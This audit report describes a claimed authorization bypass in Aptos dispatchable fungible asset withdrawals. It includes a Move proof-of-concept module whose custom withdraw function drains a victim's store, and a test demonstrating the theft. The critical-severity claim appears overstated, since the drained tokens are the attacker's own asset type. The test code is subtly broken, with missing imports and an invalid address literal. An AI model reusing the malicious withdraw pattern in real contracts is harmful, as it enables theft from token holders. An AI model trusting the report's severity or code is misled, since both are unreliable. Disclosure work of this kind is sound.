# Audit Report

## Title
Authorization Bypass in Dispatchable Fungible Asset Custom Withdraw Functions Enables Cross-Store Theft

## Summary
A critical authorization bypass vulnerability exists in the dispatchable fungible asset system. Custom withdraw functions receive a `TransferRef` that is scoped to the fungible asset type (metadata) rather than individual stores. This allows malicious custom withdraw functions to steal assets from any store holding the same fungible asset type, completely bypassing the per-store authorization checks.

## Finding Description

The vulnerability arises from an architectural flaw in how `TransferRef` capabilities are scoped and passed to custom withdraw functions. [1](#0-0) 

The `dispatchable_fungible_asset::withdraw` function performs authorization checks on the original `store` parameter, verifying ownership and permissions. However, it then obtains a `TransferRef` from the fungible asset metadata and passes it to the custom withdraw function. [2](#0-1) 

The `TransferRef` is obtained from the metadata address (the fungible asset type), not from the individual store. This means it can be used to access **any** store holding that fungible asset type.

The custom withdraw function signature expects: [3](#0-2) 

A malicious custom withdraw function can:
1. Ignore the `store` parameter that was authorized
2. Use `object::address_to_object<T>()` to create a reference to a victim's store
3. Call `fungible_asset::withdraw_with_ref()` with the `TransferRef` on the victim's store [4](#0-3) 

The `withdraw_with_ref` function only validates that the `TransferRef`'s metadata matches the store's metadataâ€”it does NOT verify store ownership. This check passes for any store holding the same fungible asset type.

**Attack Path:**

1. Attacker deploys a malicious fungible asset "MaliciousCoin" with a custom withdraw function
2. Attacker distributes MaliciousCoin to victims (airdrops, listings, social engineering)
3. Victim creates a store and receives 1000 MaliciousCoin
4. Attacker creates their own store with 1 MaliciousCoin
5. Attacker calls `dispatchable_fungible_asset::withdraw(attacker_signer, attacker_store, 1)`
   - Authorization checks pass (attacker owns attacker_store)
   - Custom withdraw function receives the metadata-scoped `TransferRef`
6. Malicious withdraw function:
   ```move
   public fun withdraw<T: key>(
       store: Object<T>,  // attacker_store (ignored)
       amount: u64,       // 1 (ignored)
       transfer_ref: &TransferRef,
   ): FungibleAsset {
       let victim_store = object::address_to_object<FungibleStore>(KNOWN_VICTIM_ADDRESS);
       fungible_asset::withdraw_with_ref(transfer_ref, victim_store, 1000)
   }
   ```
7. Victim's 1000 MaliciousCoin stolen

This breaks the fundamental security invariant that fungible asset withdrawals must be authorized by the store owner.

## Impact Explanation

**Critical Severity** - Loss of Funds (up to $1,000,000 per Aptos Bug Bounty)

This vulnerability enables:
- **Complete theft of fungible assets** from any user holding a malicious dispatchable fungible asset
- **Unlimited scope**: Attacker can steal from all stores holding their malicious asset
- **No special privileges required**: Any unprivileged transaction sender can deploy malicious assets
- **Silent exploitation**: Victims have no way to detect the malicious withdraw logic until funds are stolen
- **Ecosystem-wide impact**: Affects the fundamental security model of fungible assets

The impact is equivalent to a complete authorization bypass for fungible asset transfers, undermining the core security guarantee that only store owners can withdraw their assets.

## Likelihood Explanation

**High Likelihood**

The attack requires:
- Deploying a Move module with a malicious custom withdraw function (straightforward)
- Distributing the malicious asset to victims (common via airdrops, DEX listings, social media)
- Triggering a single transaction to steal funds (trivial)

No special permissions, validator access, or complex attack coordination is needed. The vulnerability is inherent in the architecture and will affect any dispatchable fungible asset with a custom withdraw function that exploits this design flaw.

Likelihood is reduced only by the requirement that victims must hold the malicious asset, but this is easily achievable through standard token distribution mechanisms.

## Recommendation

**Immediate Fix:** Bind `TransferRef` to specific stores rather than just metadata, or perform runtime validation that custom functions only access the authorized store.

**Recommended Solution 1 - Store-Scoped TransferRef:**

Modify the `TransferRef` to include the authorized store address and validate it in `withdraw_with_ref`:

```move
// In fungible_asset.move
struct TransferRef has drop, store {
    metadata: Object<Metadata>,
    authorized_store: Option<address>, // New field
}

public fun withdraw_with_ref<T: key>(
    self: &TransferRef, store: Object<T>, amount: u64
): FungibleAsset acquires FungibleStore, ConcurrentFungibleBalance {
    assert!(
        self.metadata == store_metadata(store),
        error::invalid_argument(ETRANSFER_REF_AND_STORE_MISMATCH)
    );
    // NEW: Validate authorized store if set
    if (self.authorized_store.is_some()) {
        assert!(
            *self.authorized_store.borrow() == store.object_address(),
            error::permission_denied(EUNAUTHORIZED_STORE_ACCESS)
        );
    };
    unchecked_withdraw(store.object_address(), amount)
}
```

**Recommended Solution 2 - Remove TransferRef from Custom Functions:**

Don't pass `TransferRef` to custom withdraw functions. Instead, have them return withdrawal decisions, and the framework performs the actual withdrawal:

```move
// Custom function signature changes to:
public fun withdraw<T: key>(
    store: Object<T>,
    amount: u64,
): WithdrawDecision  // Returns decision, doesn't perform withdrawal

struct WithdrawDecision {
    approved: bool,
    actual_amount: u64,  // Can modify amount for deflation/fees
}

// Framework validates decision and performs withdrawal with its own TransferRef
```

This prevents custom functions from accessing the TransferRef entirely.

## Proof of Concept

```move
module attacker::malicious_token {
    use aptos_framework::fungible_asset::{Self, FungibleAsset, TransferRef};
    use aptos_framework::dispatchable_fungible_asset;
    use aptos_framework::object::{Self, ConstructorRef, Object};
    use aptos_framework::function_info;
    use std::option;
    use std::signer;
    use std::string;

    // Store the victim's store address
    struct VictimConfig has key {
        victim_store_address: address,
    }

    public fun initialize(attacker: &signer, constructor_ref: &ConstructorRef) {
        let withdraw = function_info::new_function_info(
            attacker,
            string::utf8(b"malicious_token"),
            string::utf8(b"withdraw"),
        );

        dispatchable_fungible_asset::register_dispatch_functions(
            constructor_ref,
            option::some(withdraw),
            option::none(),
            option::none(),
        );
    }

    // Attacker sets victim's store address
    public entry fun set_victim(attacker: &signer, victim_store: address) {
        move_to(attacker, VictimConfig { victim_store_address: victim_store });
    }

    // Malicious withdraw function - steals from victim instead of authorized store
    public fun withdraw<T: key>(
        store: Object<T>,        // Authorized store (attacker's) - IGNORED
        amount: u64,             // Requested amount - IGNORED
        transfer_ref: &TransferRef,
    ): FungibleAsset acquires VictimConfig {
        // Ignore the authorized store parameter
        // Convert victim's store address to Object
        let victim_config = borrow_global<VictimConfig>(@attacker);
        let victim_store = object::address_to_object<fungible_asset::FungibleStore>(
            victim_config.victim_store_address
        );
        
        // Steal from victim's store instead!
        // This bypasses the authorization check that was performed on 'store'
        fungible_asset::withdraw_with_ref(transfer_ref, victim_store, 1000)
    }
}

// Test demonstrating the theft:
#[test_only]
module attacker::malicious_token_test {
    use attacker::malicious_token;
    use aptos_framework::fungible_asset;
    use aptos_framework::dispatchable_fungible_asset;
    use aptos_framework::object;
    
    #[test(attacker = @attacker, victim = @0xVICTIM, framework = @aptos_framework)]
    fun test_cross_store_theft(
        attacker: &signer,
        victim: &signer,
        framework: &signer,
    ) {
        // 1. Attacker creates malicious fungible asset
        let constructor_ref = object::create_named_object(attacker, b"MaliciousCoin");
        let metadata = fungible_asset::add_fungibility(
            &constructor_ref,
            option::none(),
            string::utf8(b"Malicious"),
            string::utf8(b"MAL"),
            8,
            string::utf8(b""),
            string::utf8(b""),
        );
        malicious_token::initialize(attacker, &constructor_ref);
        let mint_ref = fungible_asset::generate_mint_ref(&constructor_ref);

        // 2. Create stores for victim and attacker
        let victim_store = fungible_asset::create_test_store(victim, metadata);
        let attacker_store = fungible_asset::create_test_store(attacker, metadata);
        
        // 3. Victim receives 1000 tokens
        let fa = fungible_asset::mint(&mint_ref, 1000);
        dispatchable_fungible_asset::deposit(victim_store, fa);
        assert!(fungible_asset::balance(victim_store) == 1000, 1);

        // 4. Attacker receives 1 token
        let fa = fungible_asset::mint(&mint_ref, 1);
        dispatchable_fungible_asset::deposit(attacker_store, fa);

        // 5. Attacker configures victim's store address
        malicious_token::set_victim(attacker, object::object_address(&victim_store));

        // 6. ATTACK: Attacker calls withdraw on THEIR OWN store (passes authorization)
        //    But malicious function steals from VICTIM's store
        let stolen_fa = dispatchable_fungible_asset::withdraw(attacker, attacker_store, 1);
        
        // 7. VERIFY: Attacker received 1000 tokens (stolen from victim)
        //    Even though they only requested to withdraw 1 from their own store!
        assert!(fungible_asset::amount(&stolen_fa) == 1000, 2);
        
        // 8. VERIFY: Victim's balance is now 0 (stolen)
        assert!(fungible_asset::balance(victim_store) == 0, 3);
        
        // Attacker can deposit to their own account
        dispatchable_fungible_asset::deposit(attacker_store, stolen_fa);
    }
}
```

**Notes:**

The vulnerability stems from the architectural decision to scope `TransferRef` to fungible asset metadata rather than individual stores. This creates a fundamental mismatch between where authorization is checked (per-store) and what capability is granted (metadata-wide). The object natives enable address-to-object conversion, which combined with the dispatchable function mechanism, creates an exploitable authorization bypass.

### Citations

**File:** aptos-move/framework/aptos-framework/sources/dispatchable_fungible_asset.move (L71-92)
```text
    public fun withdraw<T: key>(
        owner: &signer,
        store: Object<T>,
        amount: u64,
    ): FungibleAsset acquires TransferRefStore {
        fungible_asset::withdraw_sanity_check(owner, store, false);
        fungible_asset::withdraw_permission_check(owner, store, amount);
        let func_opt = fungible_asset::withdraw_dispatch_function(store);
        if (func_opt.is_some()) {
            let func = func_opt.borrow();
            function_info::load_module_from_function(func);
            let fa = dispatchable_withdraw(
                store,
                amount,
                borrow_transfer_ref(store),
                func,
            );
            fa
        } else {
            fungible_asset::unchecked_withdraw(store.object_address(), amount)
        }
    }
```

**File:** aptos-move/framework/aptos-framework/sources/dispatchable_fungible_asset.move (L188-195)
```text
    inline fun borrow_transfer_ref<T: key>(metadata: Object<T>): &TransferRef {
        let metadata_addr = fungible_asset::store_metadata(metadata).object_address();
        assert!(
            exists<TransferRefStore>(metadata_addr),
            error::not_found(ESTORE_NOT_FOUND)
        );
        &borrow_global<TransferRefStore>(metadata_addr).transfer_ref
    }
```

**File:** aptos-move/framework/aptos-framework/sources/dispatchable_fungible_asset.move (L197-202)
```text
    native fun dispatchable_withdraw<T: key>(
        store: Object<T>,
        amount: u64,
        transfer_ref: &TransferRef,
        function: &FunctionInfo,
    ): FungibleAsset;
```

**File:** aptos-move/framework/aptos-framework/sources/fungible_asset.move (L1104-1112)
```text
    public fun withdraw_with_ref<T: key>(
        self: &TransferRef, store: Object<T>, amount: u64
    ): FungibleAsset acquires FungibleStore, ConcurrentFungibleBalance {
        assert!(
            self.metadata == store_metadata(store),
            error::invalid_argument(ETRANSFER_REF_AND_STORE_MISMATCH)
        );
        unchecked_withdraw(store.object_address(), amount)
    }
```
